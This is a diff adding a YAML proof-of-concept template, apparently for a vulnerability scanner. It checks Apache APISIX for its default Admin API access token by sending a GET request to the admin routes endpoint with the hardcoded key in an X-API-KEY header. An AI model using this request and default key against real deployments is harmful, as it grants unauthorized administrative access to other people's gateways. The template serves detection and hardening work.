@@ -1,0 +1,18 @@
+id: poc-yaml-apisix-admin-api-default-access-token
+info:
+  name: Apache APISIX Admin API 默认访问令牌漏洞
+  severity: medium
+  tags:
+  - 硬编码凭据
+  finger: Apache APISIX
+  osprey-id: vb_2022_0013
+requests:
+- method: GET
+  path: /apisix/admin/routes
+  headers:
+    X-API-KEY: edd1c9f034335f136f87ad84b625c8f1
+  expression: 'contains(body, "\"action\":\"get\"") && contains(body, "\"node\"")
+
+    '
+variables: {}
+transport: http
